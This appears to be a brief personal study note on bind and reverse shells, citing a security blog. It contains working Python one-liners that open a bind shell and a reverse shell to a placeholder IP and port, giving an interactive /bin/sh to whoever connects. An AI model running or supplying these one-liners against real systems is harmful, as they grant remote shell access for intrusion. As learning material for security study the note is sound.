## 1. definition
### 1.1. reverse shell
victim =[request]=> attacker

### 1.2. bind shell
attacker =[request]=> victim

## 2. how
### 2.1. bind shell
(1) attacker exploits victim; listening socket with shell is created
(2) connect to the listening socket

### 2.2. reverse shell
(1) create listener on port
(2) attacker exploits victim; make it connect to that port

## 3. code
### 3.1. bind shell

```sh
python3 -c 'import socket,os,subprocess;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.bind((“<ip>",<port>));
s.listen(5);
c,a=s.accept();
os.dup2(c.fileno(),0);
os.dup2(c.fileno(),1);
os.dup2(c.fileno(),2);
p=subprocess.call(["/bin/sh","-i"])'
```

(IPv4 version)
(1) listens for connection
(2) starts shell after connection

### 3.2. reverse shell

```sh
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("<IP>",<PORT>));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"])'
```

(IPv4 version)
(1) connect to port
(2) start shell

## 4. difference
the difference lies in who establishes connection; bind shell can't be used if target is behind NAT or firewall

## 5. case study


reference (all):
<https://www.darkrelay.com/post/bind-and-reverse-shells>